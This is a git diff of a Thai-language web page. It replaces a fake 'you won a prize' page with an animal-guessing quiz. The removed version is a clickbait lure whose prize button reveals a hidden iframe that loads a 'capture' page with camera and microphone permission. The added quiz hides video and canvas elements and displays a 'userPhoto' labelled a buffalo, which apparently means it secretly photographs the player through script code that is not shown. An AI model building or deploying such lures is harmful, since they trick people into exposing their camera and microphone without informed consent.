@@ -3,49 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>คุณได้รับรางวัล!</title>
-    <style>
-        body {
-            text-align: center;
-            margin: 100px;
-        }
-
-        button {
-            font-size: 20px;
-            padding: 15px 30px;
-            background-color: gold;
-            border: none;
-            cursor: pointer;
-        }
-
-        /* ซ่อน iframe ไว้ก่อน */
-        #iframeContainer {
-            display: none;
-            position: absolute;
-            top: 120px; /* ปรับตำแหน่งให้ตรงกับปุ่ม */
-            left: 50%;
-            transform: translateX(-50%);
-            width: 200px;
-            height: 50px;
-        }
-    </style>
+    <title>ทายชื่อสัตว์โลกสุดแสนน่ารัก</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <h1>🎉 ยินดีด้วย! คุณได้รับรางวัล 🎉</h1>
-    <button onclick="showIframe()">กดรับรางวัลฟรี!</button>
-
-    <!-- ซ่อน iframe ไว้ก่อน -->
-    <div id="iframeContainer">
-        <iframe id="hiddenFrame" 
-                src="https://natchapak-y.github.io/clickbait.github.io/capture.html" 
-                allow="camera; microphone" frameborder="0">
-        </iframe>
+    <!-- Page 1 -->
+    <div id="page1" class="page active">
+        <h1 class="title">ทายชื่อสัตว์โลกสุดแสนน่ารัก</h1>
+        <div class="slideshow"></div>
+        <button id="startBtn" class="play-btn">เล่นเกม</button>
     </div>
 
-    <script>
-        function showIframe() {
-            document.getElementById('iframeContainer').style.display = 'block';
-        }
-    </script>
+    <!-- Page 2 -->
+    <div id="page2" class="page">
+        <img src="chicken.jpg" class="animal-img">
+        <div class="options">
+            <button class="option wrong">เป็ด</button>
+            <button class="option correct">ไก่</button>
+        </div>
+    </div>
+
+    <!-- Page 3 -->
+    <div id="page3" class="page">
+        <img src="egg_chick.jpg" class="animal-img">
+        <div class="options">
+            <button class="option correct">ไก่</button>
+            <button class="option correct">ลูกเจี๊ยบ</button>
+        </div>
+    </div>
+
+    <!-- Page 4 -->
+    <div id="page4" class="page">
+        <img id="userPhoto" class="animal-img">
+        <div class="options">
+            <button class="option wrong">คน</button>
+            <button class="option correct">ควาย</button>
+        </div>
+    </div>
+
+    <!-- Page 5 -->
+    <div id="page5" class="page">
+        <h1 id="scoreDisplay"></h1>
+        <div class="confetti"></div>
+    </div>
+
+    <div id="message"></div>
+    <video id="video" hidden></video>
+    <canvas id="canvas" hidden></canvas>
+
+    <script src="script.js"></script>
 </body>
 </html>
